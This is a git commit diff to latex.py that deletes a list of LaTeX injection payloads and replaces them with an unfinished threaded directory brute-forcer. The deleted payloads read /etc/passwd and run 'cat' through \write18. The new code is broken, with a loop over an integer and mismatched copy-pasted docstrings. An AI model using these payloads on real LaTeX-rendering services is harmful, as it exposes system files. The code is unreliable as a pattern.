9709c7f5b2d716ee425b87fc124af1502aafc6fa
Seyptoo <39600961+Seyptoo@users.noreply.github.com>
2018-12-21 09:12:46 +0100

    Update latex.py

--- latex.py
+++ latex.py
@@ -2,35 +2,66 @@
 
 import sys
 import requests
+import options as argument
+import Queue
 
 from optparse import *
 from threading import Thread
 
-class Latex(object):
-        def __init__(self, latex_payload=None):
-                self.latex_payload = latex_payload
+class pyDirb(Thread):
+	def __init__(self, threads=35):
+		# options create on 'options.py'.
+		self.URL = argument.url
+		self.WORDLIST = argument.wordlist
+		self.DIRECTORY = argument.directory
 
-        def __str__(self, *args):
-                """
-                This function will take
-                the port defined in the URL :D
-                Parameters
-                ----------
-                self : X
-                        The parameter 'self' is a supervariable that can communicate anywhere.
-                Return
-                ----------
-                Return port or nothing
-                """
-                self.latex_payload = ["\input{/etc/passwd}",
-                                        "\include{password}",
-                                        "\usepackage{verbatim}"
-                                        "\input{|'/etc/passwd'}",
-                                        "\input|more /etc/passwd",
-                                        "\verbatiminput{/etc/passwd}",
-                                        "\immediate\write18{cat /etc/passwd}",
-                                        "\newread\file",
-                                        "\openin\file=/etc/passwd",
-                                        "\read\file to\line",
-                                        "\text{\line}",
-                                        "\closein\file"]
+		self.THREADS = threads
+		Thread.__init__(self)
+
+	def brute_functions(self, q):
+		"""
+		This function will take
+		the port defined in the URL :D
+		Parameters
+		----------
+		self : X
+			The parameter 'self' is a supervariable that can communicate anywhere.
+		Return
+		----------
+		Return port or nothing
+		"""
+		if(self.DIRECTORY == True):
+			while True:
+				wordlist_boolen = q.get()
+
+	def run(self):
+		"""
+		This function will take
+		the port defined in the URL :D
+		Parameters
+		----------
+		self : X
+			The parameter 'self' is a supervariable that can communicate anywhere.
+		Return
+		----------
+		Return port or nothing
+		"""
+		q = Queue.Queue()
+
+		with open(self.WORDLIST, "r") as file:
+			for line_strip in file:
+				q.put(line_strip.rstrip("\n\r"))
+
+			self.brute_functions(q)
+
+		for i in self.THREADS:
+			wrapper = threading.Thread(target=self.brute_functions(i), args=(i, q))
+			wrapper.setDaemon(True)
+			wrapper.start()
+			wrapper.join(600)
+
+		q.join()
+
+if __name__ == "__main__":
+	Algorithm = pyDirb()
+	Algorithm.start()
